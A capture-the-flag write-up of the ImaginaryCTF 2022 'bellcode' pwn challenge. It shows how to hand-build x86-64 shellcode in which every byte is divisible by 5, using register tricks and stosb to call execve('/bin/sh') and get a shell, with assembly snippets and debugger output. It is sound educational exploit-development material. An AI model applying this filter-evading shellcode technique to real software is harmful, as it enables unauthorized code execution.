---

title: bellcode [IMAGINARY CTF] [PWN]

date: 2022-07-18 11:28:05 +0200

categories: [shellcode,pwn]

tags: [CTFTIME]

---

## Bellcode - ImaginaryCTF

![](https://i.imgur.com/owT2Wlk.png)

- Mitigations

```ruby
➜  bellcode pwn checksec bellcode
[*] '/home/kali/CTFs/CTFtime/imaginaryctf/pwn/bellcode/bellcode'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

- It's a 64 bit ELF file and PIE enabled. 
- Let's see if we can find any leaks in the file by running it 

![](https://i.imgur.com/80fzVFE.png)
- Seems like we can't leak anything, Let's open it up in IDA
---

### Debugging part

> Decompiled view of main function

![](https://i.imgur.com/onUql6h.png)
- I've commented out everything in detail (see the above image)

### what it does?

![](https://i.imgur.com/n72F1st.png)

- First it creates a **read, write, executable** area in memory for **0x2000** bytes
- Then it gets our input for **4096** bytes and stores it in that mmaped area
- Finally it checks every byte of our input and divides it with 5,
	- if it's dividable by 5, then it executes our input
	- else it simply exits

> what we can do with it??

### plan
- Our plan is to craft a shellcode with multiples of 5 
	- seems confusing right?
	- So we need to write a shellcode, in that shellcode every byte need to be divisible by 5
- Ok how can we do that?
	- First let's make a script to see what are the bytes we can use
	- And disassemble those bytes into assembly instructions
	- Then let's try to get a lead by using that instructions in our shellcode

> **FYKI:**  This writeup focus on fully pure multiples of 5 shellcode, there are several writeups that include two stages (refer that if you need to save a lot of time.
 

### Finding valid instructions by brute forcing [0x00 to 0xff]

```python
from pwn import disasm

valid_instructions = []

for byte in range(0x00,0xff):
	if (byte % 5) == 0:
		valid_instructions.append(byte)

for valid_byte in valid_instructions:
	byte = valid_byte.to_bytes(1,'little')
	print(disasm(byte))
```

> output

![](https://i.imgur.com/SbEMnvC.png)

```css
   0:   1e                      push   ds
   0:   37                      aaa
   0:   41                      inc    ecx
   0:   46                      inc    esi
   0:   4b                      dec    ebx
   0:   50                      push   eax
   0:   55                      push   ebp
   0:   5a                      pop    edx
   0:   5f                      pop    edi
   0:   64                      fs
   0:   6e                      outs   dx, BYTE PTR ds:[esi]
   0:   91                      xchg   ecx, eax
   0:   96                      xchg   esi, eax
   0:   9b                      fwait
   0:   a5                      movs   DWORD PTR es:[edi], DWORD PTR ds:[esi]
   0:   aa                      stos   BYTE PTR es:[edi], al
   0:   af                      scas   eax, DWORD PTR es:[edi]
   0:   c3                      ret
   0:   d7                      xlat   BYTE PTR ds:[ebx]
   0:   f0                      lock
   0:   f5                      cmc
   0:   fa                      cl
```

- These are some valid single byte instructions that are divisible by 5 (truncated the unwanted instructions)

- But there's no syscall in this output
	- Let's see that maually

![](https://i.imgur.com/wpSN1sc.png)
- These bytes also divisible by 5, so there's no issues while calling the syscall


#### Exploit structure

```c
execve('/bin/sh',0,0);
```
- Main goal of our shellcode is to call **execve** syscall with these arguments, so we can get  a shell

```css
rax: 0x3b      ; syscall number
rdi: '/bin/sh' ; first argument need to be a pointer to '/bin/sh'
rsi: 0         ; argv
rdx: 0         ; envp
```

- If we placed the above things correctly then we can call syscall to get shell :D
- Now let's try to craft this exploit


### Exploitation part

> Get intial register values

- Let's try to get some info about the available registers, so we can use already available values

```css
 RAX  0x0
 RBX  0x5555555552f0 (__libc_csu_init) ◂— endbr64
 RCX  0x7ffff7ec3603 (write+19) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0xfac300 ◂— 0xa32 /* '2\n' */
 RDI  0x7ffff7fa6670 (_IO_stdfile_1_lock) ◂— 0x0
 RSI  0x7ffff7fa4743 (_IO_2_1_stdout_+131) ◂— 0xfa6670000000000a /* '\n' */
 R8   0x20
 R9   0x0
 R10  0x21
 R11  0x246
 R12  0x5555555550e0 (_start) ◂— endbr64
 R13  0x0
 R14  0x0
 R15  0x0
 RBP  0x7fffffffe560 ◂— 0x0
*RSP  0x7fffffffe548 —▸ 0x5555555552e0 (main+279) ◂— mov    eax, 0
*RIP  0xfac300 ◂— 0xa32 /* '2\n' */
```

- `RAX, R9, R13, R14, R15`  are null
- So let's make use of it

#### Craft RDX = 0x0

```css
push rax
pop rdx
```
- rax is 0 so let's push that into stack and pop that into rdx

```css
 RAX  0x0
 RBX  0x559a001002f0 (__libc_csu_init) ◂— endbr64
 RCX  0x7ffa5ba16603 (write+19) ◂— cmp    rax, -0x1000 /* 'H=' */
*RDX  0x0
```

- Now our registers will lools like this

#### Craft RSI = 0x0
 
```css
xchg   esi, eax
```
- rax is 0 so let's exchange it with esi

```css
*RAX  0x3edfa743
 RBX  0x56153b17f2f0 (__libc_csu_init) ◂— endbr64
 RCX  0x7fe53ed19603 (write+19) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x0
 RDI  0x7fe53edfc670 (_IO_stdfile_1_lock) ◂— 0x0
*RSI  0x0
```
- Now our registers will lools like this
- rsi, rdx done. Now for the big part


### Craft RDI = '/bin/sh' pointer

- First we don't have `/bin/sh` in the binary
- Also we don't know it's position in libc, coz we don't have any libc leaks
- So we need to move that manual to the memory and make a pointer to point that string
- Here the problem is we are limited to instructions
- We can't use instructions like  `mov <rax or any register name starts with r>, <some value>`
- We can only use some `inc, dec, sub`  instructions
- Also we can't move the whole 8 bytes to a register since we can't use any full register
- So we need to move this 7 byte string byte by byte into some place
- And finally push that to stack and make a pointer to it by `pop rdi`
- Before that we need to make rax again to 0x0

```css
xchg eax,r14d
```
- Since **r14** has 0x0 we can exchange that with **eax**


> Useful instruction

```css
sub    eax, <some value>
```

- By using that we can subtract some value in eax register
- But we're limited to multiples of 5
- So let's use another instruction called

![](https://i.imgur.com/OCd8wlk.png)

```css
dec eax
```

- By using this two registers we can perfectly set a value in rax
- Ok what's next? how we're going to move that to a pointer

```css
push rbp
```
- This pushes rbp address to stack

```css
pop rdi
```
- This tooks that value and store it rdi
- Now get ready for a magic instruction

```css
stos   BYTE PTR es:[rdi], al
```
- This moves our last byte of rax to the pointer of rdi
- So we can write a byte in rbp
- Let's try that
- First set the value of rax to **0x2f** (that's basically the hex of  the string '/' )

```css
dec eax
sub eax,0xfffffaff
sub eax,0xff
sub eax,0xff
sub eax,0xff
sub eax,0xff
sub eax,0xd2
dec eax
dec eax
dec eax
```

- This decrements eax and finally sets that to 0x2f
- Now let's do the remaining things

```css
push rbp
pop rdi
stos   BYTE PTR es:[rdi], al
```

- This moves our 0x2f to the last byte of rdi pointed location
- It points our rbp so we can get '/' in rbp

![](https://i.imgur.com/ZRIqUdC.png)
- Here we successfully moved `/` to the rbp
- Now let's try to move the other strings also

> speed runnnnnnnnn 🏃

- I will attach a full writeup in the ending of the writeup

![](https://i.imgur.com/QwH0wIz.png)

- Now let's push rbp and pop rdi, ez pz

![](https://i.imgur.com/It9cx2u.png)
- Everything is set perfectly, just need to change the value in rax to `0x3b`


### Craft RAX = 0x3b

- Now let's set decrement rax and make a syscall

![](https://i.imgur.com/KJc5Zps.png)
- Cool we got it
- Now let's try this in remote

![](https://i.imgur.com/Sx2l5Yg.png)
- Perfect <3
- Thank you for reading my blog post, I hope you enjoyed it. 
- See you soon in my next one, Cheers

![](https://tenor.com/view/cat-cute-animals-bye-bye-gif-13883217)

Here is the full exploit script: [exploit link](https://github.com/jopraveen/exploit-development/blob/main/CTF/imaginaryCTF2022/pwn/bellcode/solve.py)

